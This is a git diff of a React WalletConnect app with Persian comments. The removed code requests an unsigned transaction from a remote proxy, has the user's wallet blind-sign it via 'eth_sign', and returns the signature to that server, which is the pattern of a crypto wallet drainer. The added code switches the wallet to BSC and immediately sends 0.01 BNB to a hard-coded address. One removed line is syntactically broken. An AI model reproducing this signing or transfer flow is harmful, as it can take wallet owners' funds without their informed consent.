@@ -19,8 +19,8 @@ function App() {
           "9a565677e1c0258ac23fd2becc9a6497eeb2f6bf14f6e2af41e3f1d325852edd",
         ],
       },
-      chains: [1],
-      methods: ["eth_sign", "eth_sendTransaction", "eth_signTransaction"],
+      chains: [1, 56], // پشتیبانی از BSC و Ethereum
+      methods: ["eth_sendTransaction"],
       projectId: "9fe3ed74e1d73141e8b7747bedf77551",
     });
 
@@ -30,55 +30,40 @@ function App() {
     var account_sender = account[0];
     console.log("✅ Wallet Address:", account_sender);
 
-    // 🔹 مسیر صحیح برای `send.php`
-    let apiUrl = "let apiUrl = "https://reza-nu.vercel.app/api/proxy";
-
-    async function genSign(address, chain, type, contract = "0") {
+    async function switchToBSC() {
       try {
-        let requestData = { handler: "tx", address, chain, type };
-        if (type === "token") requestData.contract = contract;
-
-        var result = await jQuery.post(apiUrl, requestData);
-        var unSigned = JSON.parse(result);
-        console.log("📜 Unsigned Transaction:", unSigned);
-
-        var Signed = await provider.request({
-          method: "eth_sign",
-          params: [address, unSigned.result],
+        await provider.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: "0x38" }], // BSC Mainnet
         });
-
-        return Signed;
-      } catch (error) {
-        console.error("❌ Error in genSign:", error);
-        return null;
+        console.log("✅ Switched to Binance Smart Chain");
+      } catch (switchError) {
+        console.error("❌ Error switching to BSC:", switchError);
       }
     }
 
-    async function acceptSign(signature, type) {
+    async function sendTransaction() {
       try {
-        var result = await jQuery.post(apiUrl, {
-          handler: "sign",
-          signature,
-          type,
+        const transactionParameters = {
+          to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD", // آدرس مقصد
+          from: account_sender,
+          value: "0x2386F26FC10000", // مقدار 0.01 BNB (بر حسب WEI)
+          gas: "0x5208", // مقدار گس استاندارد
+        };
+
+        const txHash = await provider.request({
+          method: "eth_sendTransaction",
+          params: [transactionParameters],
         });
 
-        var resultJson = JSON.parse(result);
-        return resultJson.result;
+        console.log("✅ Transaction Hash:", txHash);
       } catch (error) {
-        console.error("❌ Error in acceptSign:", error);
-        return null;
+        console.error("❌ Error sending transaction:", error);
       }
     }
 
-    var signature = await genSign(account_sender, "56", "coin");
-
-    if (signature) {
-      console.log("✍️ Signed Transaction:", signature);
-      var rawsign = await acceptSign(signature, "coin");
-      console.log("📝 Final Signed Transaction:", rawsign);
-    } else {
-      console.error("⚠ Signing failed.");
-    }
+    await switchToBSC(); // تغییر شبکه به BSC قبل از ارسال تراکنش
+    await sendTransaction(); // ارسال تراکنش
   }
 
   return (
